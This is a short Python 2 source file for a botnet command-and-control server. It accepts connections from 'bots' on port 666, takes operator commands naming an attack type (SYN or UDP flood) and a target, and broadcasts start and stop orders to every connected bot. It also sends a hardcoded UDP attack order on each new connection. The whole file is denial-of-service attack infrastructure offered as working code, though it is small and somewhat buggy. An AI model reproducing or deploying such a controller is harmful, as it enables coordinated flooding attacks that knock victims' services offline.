# This will be the command server, talking to our bots (attackers)
import sys
import thread
import socket

# List of connected bots
bots = []

# Read input from terminal, and send commands to the bots
def readCommands():
	while 1:
		inString = raw_input('<start/stop> <syn/udp> <target>')
		print 
		command, atkType, victim = inString.split(' ')
		if command is 'start':
			for bot in bots:
				bot.send('START'+ '/' + atkType + '/' + victim)
		elif command is 'stop':
			for bot in bots:
				bot.send('STOP' + '/' + victim)

#Host a server, listening for bots to make a connection
if __name__=='__main__':
	thread.start_new_thread(readCommands, ())

	#Server
	host = '127.0.0.1' #socket.gethostbyname(socket.gethostname())
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.bind((host, 666))
	serversocket.listen(999)

	while 1:
	    botsock, addr = serversocket.accept()
	    bots.append(botsock)
	    bots[0].send("START/udp/19232432")